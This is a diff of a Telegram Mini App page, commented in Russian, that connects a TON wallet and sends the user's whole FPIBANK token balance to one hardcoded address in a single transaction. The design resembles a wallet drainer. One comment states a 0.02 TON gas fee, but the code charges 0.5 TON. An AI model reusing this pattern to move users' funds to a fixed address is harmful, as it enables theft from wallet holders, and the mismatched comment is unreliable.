@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0" />
 
-  <!-- CSP на всякий случай -->
+  <!-- CSP (не обязательно, но полезно) -->
   <meta
     http-equiv="Content-Security-Policy"
     content="
@@ -17,12 +17,12 @@
     "
   />
 
-  <title>Telegram Mini App: TON Connect Jetton Transfer + Mint</title>
+  <title>Telegram Mini App: Отправка всех FPIBANK</title>
 
   <!-- Telegram WebApp (Mini App) -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
 
-  <!-- TonConnect SDK (тонконнект) -->
+  <!-- TonConnect SDK -->
   <script src="./js/tonconnect-sdk.min.js"></script>
 
   <!-- TonConnect UI -->
@@ -30,18 +30,16 @@
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
 </head>
 <body>
-  <h1>Telegram Mini App: Отправка всех FPIBANK + Mint</h1>
+  <h1>Telegram Mini App: Отправка всех FPIBANK</h1>
 
   <!-- Кнопка TonConnect (подключение кошелька) -->
   <div id="ton-connect"></div>
 
-  <!-- Кнопка «Отправить все и заминтить» -->
-  <button id="sendTransaction">Отправить все FPIBANK и минт</button>
+  <!-- Кнопка «Отправить все токены FPIBANK» -->
+  <button id="sendTransaction">Отправить все FPIBANK</button>
 
   <script>
-    /**
-     * Если запуск вне Telegram Mini App, создаём заглушку Telegram.WebApp.
-     */
+    // Если приложение открыто не в Telegram Mini App, создаём заглушку.
     if (typeof Telegram === "undefined") {
       window.Telegram = {
         WebApp: {
@@ -53,45 +51,30 @@
       Telegram.WebApp.ready();
     }
 
-    /**
-     * Инициализируем TonConnect UI.
-     * manifestUrl – ваш tonconnect-manifest.json (важно, чтобы он был корректным).
-     * buttonRootId – id элемента, куда будет «вставлена» TonConnect-кнопка.
-     */
+    // Инициализируем TonConnect UI
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+      // Укажите ссылку на ваш манифест, где описано название dApp, иконка и т.п.
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
+      // ID элемента, куда вставляется кнопка Connect
       buttonRootId: "ton-connect",
     });
 
-    /**
-     * Адрес Minter (контракт) токена FPIBANK.
-     * Обычно это адрес вида "EQ..." или "kQ...". У вас сейчас он в hex: 0:f42a97....
-     */
-    const jettonMasterAddress = "EQD0KpcRMh-sKO2z5-vOjgvFjTT58tO-2Nmvxqg5ocFQFtWz";
+    // Адрес Minter токена FPIBANK (в hex или base64).  
+    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
 
-    /**
-     * Адрес, куда отправляем ВСЕ FPIBANK.
-     * (TON-адрес получателя, в формате user-friendly или raw)
-     */
+    // Адрес, куда отправлять все токены (TON-адрес получателя)
     const recipientAddress = "UQCXsfFqRsY2pS3HsNzqnN0ns2ANiGrHpnmg_rQCJ-gxlqlU";
 
     /**
-     * Шаг 1: Узнать JettonWallet и баланс пользователя через tonapi.io
+     * Получаем данные о Jetton (в частности, wallet_address и balance)
+     * через tonapi.io.
      */
     async function getUserFPIBankData(userTonAddress) {
-      // 1) Запрашиваем список Jetton у данного TON-адреса
       const url = `https://tonapi.io/v2/accounts/${userTonAddress}/jettons`;
       const response = await fetch(url);
       const data = await response.json();
 
-      // 2) Ищем конкретный Jetton по master (minter) адресу
-      //    tonapi в объекте "balances" обычно возвращает:
-      //    {
-      //       jetton: { address: "...", ... },
-      //       wallet_address: "...",
-      //       balance: "12345",
-      //       ...
-      //    }
+      // Ищем нужный Jetton по адресу minter
       const jettonData = data.balances.find(
         (j) => j.jetton.address === jettonMasterAddress
       );
@@ -103,85 +86,62 @@
         };
       }
 
-      // balance – строка в «Integer» формате (часто учитывает decimals).
-      // Для упрощения возьмём её "как есть". Можно при желании учесть decimals.
-      const balance = jettonData.balance;
-      const userJettonWallet = jettonData.wallet_address; // Адрес кошелька токена
-
+      // balance – строка. Проверьте, нужно ли учитывать decimals
+      // (tonapi может вернуть уже делённое число или целое без точки).
       return {
-        balance,
-        userJettonWallet,
+        balance: jettonData.balance,
+        userJettonWallet: jettonData.wallet_address,
       };
     }
 
     /**
-     * Шаг 2: Отправить все FPIBANK + минтить такое же кол-во
-     * Создаём ОДНУ транзакцию с двумя сообщениями:
-     *  1) transfer: все токены
-     *  2) mint: столько же токенов
-     *
-     * ВАЖНО: не все кошельки поддерживают multi-message. Иногда нужно делать 2 отдельные транзакции.
+     * Формируем одну транзакцию: переводим все Jetton FPIBANK на recipientAddress
      */
-    async function sendAllFPIBANKandMint(userTonAddress) {
-      // 1) Получаем баланс и jettonWallet
-      const { balance, userJettonWallet } = await getUserFPIBankData(
-        userTonAddress
-      );
+    async function sendAllFPIBANK(userTonAddress) {
+      // 1) Узнаём JettonWallet и баланс FPIBANK
+      const { balance, userJettonWallet } = await getUserFPIBankData(userTonAddress);
 
-      if (!userJettonWallet || balance === "0") {
-        Telegram.WebApp.showAlert("У вас нет FPIBANK либо JettonWallet не найден.");
+      if (!userJettonWallet) {
+        Telegram.WebApp.showAlert("JettonWallet не найден. Возможно, нет токенов FPIBANK.");
+        return;
+      }
+      if (balance === "0") {
+        Telegram.WebApp.showAlert("Баланс FPIBANK равен нулю.");
         return;
       }
 
-      // Сколько TON отправить на газ? Примерно 0.02 TON на каждое сообщение (подбирайте сами).
-      // В нанотонах это "20000000".
-      const GAS_TRANSFER = "20000000";
-      const GAS_MINT = "20000000";
+      // Пример – 0.02 TON для оплаты газа (в нанотонах: "20000000")
+      const gasFee = "500000000";
 
-      // 2) Формируем первый message (transfer «все токены»).
-      //    Здесь используем "type: 'jetton_transfer'", чтобы кошелёк сам сформировал Cell.
-      //    Обратите внимание, что в спецификации TonConnect есть поле "jetton", куда
-      //    нужно передать адрес minter, чтобы кошелёк знал, какой именно Jetton переводить.
-      const transferMessage = {
-        address: userJettonWallet, // JettonWallet пользователя
-        amount: GAS_TRANSFER,      // Сколько TON на оплату газа
+      // Единственное сообщение (jetton_transfer)
+      const message = {
+        address: userJettonWallet, // Ваш JettonWallet, откуда уходит перевод
+        amount: gasFee,           // Сколько TON на оплату газа
         payload: {
           type: "jetton_transfer",
           query_id: 0,
-          amount: balance,           // Отправляем ВСЕ jetton
+          amount: balance,            // Отправляем всё, что есть
           destination: recipientAddress,
           response_destination: null,
           custom_payload: null,
-          forward_ton_amount: "0",   // Пересылаемые в теле TON
+          forward_ton_amount: "0",
           forward_payload: null,
-          // ВАЖНО: поле "jetton" (адрес Minter) нужно для некоторых кошельков
+          // Важно указать адрес Minter, чтобы кошелёк понял, что за Jetton
           jetton: jettonMasterAddress
         },
       };
 
-      // 3) Формируем второй message (mint «столько же токенов»).
-      //    В стандарте TonConnect нет "jetton_mint", поэтому делаем "type: 'unknown'" + raw payload
-      //    или "type: 'comment'", но тогда нужно сгенерировать реальную Cell с методом `mint`.
-      //    Здесь – заглушка "BASE64_MINT_CELL".
-      const mintMessage = {
-        address: jettonMasterAddress, // на Minter контракт
-        amount: GAS_MINT,            // комиссия за вызов mint
-        payload: {
-          type: "unknown", // или "comment", если хотите только текст
-          data: "BASE64_MINT_CELL" // TODO: Подставьте реальный base64-пэйлоад для метода `mint`
-        }
-      };
-
-      // 4) Создаём общий объект транзакции с двумя сообщениями
+      // Собираем транзакцию
       const transaction = {
         validUntil: Math.floor(Date.now() / 1000) + 360,
-        messages: [transferMessage, mintMessage],
+        messages: [message],
       };
 
+      // Отправляем через TonConnect
       try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        console.log("sendAllFPIBANKandMint -> result:", result);
-        Telegram.WebApp.showAlert("Операция выполнена!\n" + JSON.stringify(result));
+        console.log("sendAllFPIBANK -> result:", result);
+        Telegram.WebApp.showAlert("Все токены FPIBANK отправлены!\n" + JSON.stringify(result));
       } catch (error) {
         console.error("Ошибка при sendTransaction:", error);
         Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
@@ -189,28 +149,24 @@
     }
 
     /**
-     * Обработчик клика «Отправить все FPIBANK и заминтить»
+     * Обработчик нажатия кнопки «Отправить все FPIBANK»
      */
     async function onSendTransaction() {
-      // Проверяем, что кошелёк подключён
       if (!tonConnectUI.connected) {
-        Telegram.WebApp.showAlert("Подключите сначала кошелёк через TonConnect.");
+        Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
         return;
       }
 
-      // TonConnectUI хранит адрес кошелька пользователя:
-      // (Формат может быть как user-friendly 'EQxxxx', так и raw '0:xxxx')
       const userTonAddress = tonConnectUI.wallet?.account?.address;
       if (!userTonAddress) {
-        Telegram.WebApp.showAlert("Адрес кошелька не найден.");
+        Telegram.WebApp.showAlert("Адрес вашего кошелька не найден.");
         return;
       }
 
-      // Запускаем процесс «отправить все + минт»
-      await sendAllFPIBANKandMint(userTonAddress);
+      await sendAllFPIBANK(userTonAddress);
     }
 
-    // Вешаем обработчик на кнопку
+    // Ставим обработчик клика
     document
       .getElementById("sendTransaction")
       .addEventListener("click", onSendTransaction);
